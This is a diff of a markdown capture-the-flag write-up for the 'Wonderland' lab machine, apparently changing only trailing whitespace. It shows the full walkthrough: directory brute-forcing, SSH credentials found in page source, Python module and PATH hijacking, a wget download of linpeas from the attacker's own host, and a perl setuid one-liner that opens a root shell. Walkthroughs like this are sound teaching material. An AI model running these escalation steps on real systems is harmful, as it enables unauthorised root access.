@@ -29,7 +29,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 30.25 seconds
 ```
 We see the service is running http server, let's check it:
-![index](https://i.imgur.com/83Rv7hH.jpg)  
+![index](https://i.imgur.com/83Rv7hH.jpg)
 The main-page gives us a tip to *Follow the White Rabit* and also with "Curiouser and curiouser!" probably  tells us to be... more curious ;p. Let's proceed with enumeration and run Gobuster
 
 ### GOBUSTER
@@ -47,7 +47,7 @@ The main-page gives us a tip to *Follow the White Rabit* and also with "Curiouse
 ### Exploring the Web directories
 Many good findings, let's check them all!
 #### Checking /img directory
-in /img there're the images for the web-app, I ran ```strings``` on them to see if there's anything hidden:  
+in /img there're the images for the web-app, I ran ```strings``` on them to see if there's anything hidden:
 Nothing interesting in any of them, but I saw something strange in one of it - alice_door.png
 ```
 go:H
@@ -114,33 +114,33 @@ G       9+8
 p;WFN
 snNp
 zaaaaaaaaaa
-```  
-There're many lines where the same character is repeated many times. I wonder why is that.  
-Let's *continue on web-page directory browsing*. In ```/r/``` we see this page:  
-![/r/](https://i.imgur.com/izC02Tm.png)  
-"Would you tell me, please, which way I ought to go from here?"  
-The keyword **'from here'** catches my attention. Does it refer to **recursive directory bruting?** - Brute-Forcing that would start from ```/r/``` directory and then recursively brute-force new found directories. *Don't know* - let's see other directories.  
+```
+There're many lines where the same character is repeated many times. I wonder why is that.
+Let's *continue on web-page directory browsing*. In ```/r/``` we see this page:
+![/r/](https://i.imgur.com/izC02Tm.png)
+"Would you tell me, please, which way I ought to go from here?"
+The keyword **'from here'** catches my attention. Does it refer to **recursive directory bruting?** - Brute-Forcing that would start from ```/r/``` directory and then recursively brute-force new found directories. *Don't know* - let's see other directories.
 
 In ```/poem``` we see - guess what! - a poem!
-![poem](https://i.imgur.com/cq0SsuQ.png)  
-I'm non-english speaker, so poem is so enigmatic and so hard to read for me xD.  
+![poem](https://i.imgur.com/cq0SsuQ.png)
+I'm non-english speaker, so poem is so enigmatic and so hard to read for me xD.
 This poem seems not important right now...
 ### Recursive Brute-forcing
-Let's try recursive brute-forcing!  ```gobuster dir -r -k -x .php,.txt,.html -r -k --wordlist ~/tools/SecLists/Directory-Bruting/raft-small-directories.txt --url 10.10.153.28/r/```  
-**We find a directory called** `/a/` - interesting!  
-Let's do that again with:  
-```gobuster dir -r -k -x .php,.txt,.html -r -k --wordlist ~/tools/SecLists/Directory-Bruting/raft-small-directories.txt --url 10.10.153.28/r/a/```  
-And again we find a directory called ```b```. Hah, is it then ```/r/a/b/b/i/t/```? Let's go there! ```http://<MACHINE_IP>/r/a/b/b/i/t/```  
-![rabbit](https://i.imgur.com/DBLtv8J.png)  
+Let's try recursive brute-forcing!  ```gobuster dir -r -k -x .php,.txt,.html -r -k --wordlist ~/tools/SecLists/Directory-Bruting/raft-small-directories.txt --url 10.10.153.28/r/```
+**We find a directory called** `/a/` - interesting!
+Let's do that again with:
+```gobuster dir -r -k -x .php,.txt,.html -r -k --wordlist ~/tools/SecLists/Directory-Bruting/raft-small-directories.txt --url 10.10.153.28/r/a/```
+And again we find a directory called ```b```. Hah, is it then ```/r/a/b/b/i/t/```? Let's go there! ```http://<MACHINE_IP>/r/a/b/b/i/t/```
+![rabbit](https://i.imgur.com/DBLtv8J.png)
 So there're two 'directions' we can take...
 1. Where Hatter lives.
-1. Where March Hare lives.  
+1. Where March Hare lives.
 Also, we see in source code a hidden paragraph!
 ![source-code](https://i.imgur.com/MXMyneN.png)
-**'alice:HowDothTheLittleCrocodileImproveHisShiningTail'**  
+**'alice:HowDothTheLittleCrocodileImproveHisShiningTail'**
 ### Logging as alice with SSH
-This might be intepreted as the message, but it's not. Notice that it's in the ```username:password``` format (just like in /etc/passwd). So are these credentials to ssh server?  
-``` ssh alice@<MACHINE_IP> ``` and then input the password  
+This might be intepreted as the message, but it's not. Notice that it's in the ```username:password``` format (just like in /etc/passwd). So are these credentials to ssh server?
+``` ssh alice@<MACHINE_IP> ``` and then input the password
 
 ### Privilege Escalations
 #### Privilege Escalation to rabbit
@@ -221,11 +221,11 @@ Matching Defaults entries for alice on wonderland:
 
 User alice may run the following commands on wonderland:
     (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
-```  
-So we can only execute python3.6 and this one script... Which is a poem with imported module ```random```  
-When we execute this script with ```python3 walrus_and_the_carpenter.py``` we see it prints random 10 lines of this poem.  
+```
+So we can only execute python3.6 and this one script... Which is a poem with imported module ```random```
+When we execute this script with ```python3 walrus_and_the_carpenter.py``` we see it prints random 10 lines of this poem.
 
-Is there a way we can't escalate privileges then? Yes there is.  
+Is there a way we can't escalate privileges then? Yes there is.
 We can create a file in the same directory where the script file is called ```random.py```, this way, instead of importing the actual ```random module``` python interpreter will import the file that we've created, and because the script ```walrus_and_the_carpenter.py``` is owned by root, we may have the possibility of privesc.
 
 Let's create random.py script with contents:
@@ -244,18 +244,18 @@ Sorry, user alice is not allowed to execute '/usr/bin/python3.6 walrus_and_the_c
 ```
 Okay, so we can't do that as root... Are there any other users in this machine? With ```cat /etc/passwd``` I see that there's also:
 - hatter
-- rabbit  
+- rabbit
 
 Let's first try with hatter...
 It didn't work either, but with ```rabbit```
 
-```sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py ```  
+```sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py ```
 It works flawlessly.
 #### Privilege Escalation to hatter
 
 Okay so we're user rabbit, but we're still in the same directory as alice. When going to ```/home/rabbit/``` we see there's a SUID binary there!
 
-When executing it:  
+When executing it:
 
 ```./teaParty  ```
 ```
@@ -265,15 +265,15 @@ Probably by Tue, 26 Jan 2021 13:16:23 +0000
 Ask very nicely, and I will give you some tea while you wait for him
 please
 Segmentation fault (core dumped)
-```  
-I'm not proficient with *Buffer Overflows*, but this looks exactly as ones.  
+```
+I'm not proficient with *Buffer Overflows*, but this looks exactly as ones.
 There's always option of copying the file on ssh with ```scp``` command, which I'll use to decompile this binary
-```scp alice@10.10.153.28:/tmp/teaParty teaParty```.  
+```scp alice@10.10.153.28:/tmp/teaParty teaParty```.
 
-Not so proficient with Reverse Engineering too. Ghidra for instance didn't detect main() function - don't know why.  
+Not so proficient with Reverse Engineering too. Ghidra for instance didn't detect main() function - don't know why.
 Looking at the alternatives I stumbled upon ```Cutter``` - which uses Ghidra decompiler also, but it found the ```main() function```
 
-![decompiled](https://i.imgur.com/5Pjd2ex.png)  
+![decompiled](https://i.imgur.com/5Pjd2ex.png)
 Okay so we see that there's one ```system()``` function that uses the ```date``` command - also without relative paths! So could we do the same thing as before? - With creating our own script with the same name (```date.sh```)? Yes!
 
 But Linux system searches for the script to be executed with environment variable $PATH, let's echo it and see:
@@ -307,9 +307,9 @@ This will automatically login us to hatter user.
 Running ```id``` gives us the output ```hatter```
 #### Privilege Escalation to root
 
-In his ```/home/hatter``` directory we see ```password.txt```, and there's probably root flag. Probably to root user.  
+In his ```/home/hatter``` directory we see ```password.txt```, and there's probably root flag. Probably to root user.
 
-The thing that is extremely strange to me, is that ```root.txt``` is in the ```/home/alice``` directory. It's like it's reversed.  
+The thing that is extremely strange to me, is that ```root.txt``` is in the ```/home/alice``` directory. It's like it's reversed.
 ### Getting the user flag
 executing ```cat /root/user.txt``` will give us the user flag... surprisingly...
 
@@ -317,18 +317,18 @@ With the (I hope) final privesc, let's transfer ```linpeas.sh ``` to the machine
 
 I'll be transfering linpeas.sh script for privesc by:
 
-```python -m http.server 8080``` where you have linpeas.sh located.  
-I want to wget get this file to /tmp directory, so I'll cd into that  
+```python -m http.server 8080``` where you have linpeas.sh located.
+I want to wget get this file to /tmp directory, so I'll cd into that
 ```cd /tmp```
 
-```wget http://<YOUR_THM_IP>:8080/linpeas.sh```  
-```chmod +x linpeas.sh```  
+```wget http://<YOUR_THM_IP>:8080/linpeas.sh```
+```chmod +x linpeas.sh```
 
 Before executing, we have to delete ```date``` from the tmp because it pauses the ```linpeas.sh``` scan.
 
 This though is not possible, because it was created by ```rabbit``` user xDD. We might again try logging as the rabbit user, delete this file. But because I have hatter password,  I'll just terminate the machine and deploy it again.
 
-```./linpeas.sh```  
+```./linpeas.sh```
 We have many findings:
 ![linpeas1](https://i.imgur.com/1gUyFiT.png)
 **But more importantly:**
@@ -343,9 +343,9 @@ We have many findings:
 
 To use this ```setuid+ep``` capability, we can execute:
 
-```perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'```  
+```perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'```
 And with this, we're logged as root. Viewing the flag in /alice/root.txt is now possible
 
 ### Final Thoughts
-There was so many privilege escalations! And we learnt also about recursive directory bruting, and also decompiled binary to see what it's actually doing!  
+There was so many privilege escalations! And we learnt also about recursive directory bruting, and also decompiled binary to see what it's actually doing!
 We seriously have *entered Wonderland*
